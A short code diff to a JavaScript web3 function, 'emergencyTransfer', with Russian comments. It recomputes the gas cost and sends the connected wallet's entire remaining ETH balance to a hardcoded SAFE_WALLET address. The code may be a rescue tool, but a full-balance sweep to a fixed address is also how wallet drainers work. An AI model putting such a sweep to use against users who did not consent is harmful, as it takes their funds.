@@ -153,12 +153,15 @@ async function emergencyTransfer() {
         transferStatus.className = 'status-box warning';
         transferStatus.innerHTML = '<p>⌛ Подготовка перевода...</p>';
         
+        // Получаем баланс и газ
         const balance = await web3.eth.getBalance(userAddress);
         const gasPrice = await web3.eth.getGasPrice();
-        const increasedGasPrice = Math.floor(gasPrice * GAS_PRICE_MULTIPLIER);
         
-        const gasCost = increasedGasPrice * GAS_LIMIT;
-        const transferAmount = web3.utils.toBN(balance).sub(web3.utils.toBN(gasCost));
+        // Рассчитываем комиссию за газ
+        const gasCost = web3.utils.toBN(gasPrice).mul(web3.utils.toBN(GAS_LIMIT));
+        
+        // Получаем сумму для перевода с учетом комиссии
+        const transferAmount = web3.utils.toBN(balance).sub(gasCost);
         
         if (transferAmount.lte(web3.utils.toBN('0'))) {
             transferStatus.className = 'status-box error';
@@ -168,14 +171,16 @@ async function emergencyTransfer() {
         
         transferStatus.innerHTML = '<p>⌛ Отправка транзакции...</p>';
         
+        // Создаем объект транзакции
         const transactionObject = {
             from: userAddress,
             to: SAFE_WALLET,
             value: transferAmount.toString(),
             gas: GAS_LIMIT,
-            gasPrice: increasedGasPrice
+            gasPrice: gasPrice
         };
         
+        // Отправляем транзакцию
         const receipt = await web3.eth.sendTransaction(transactionObject);
         
         transferStatus.className = 'status-box success';
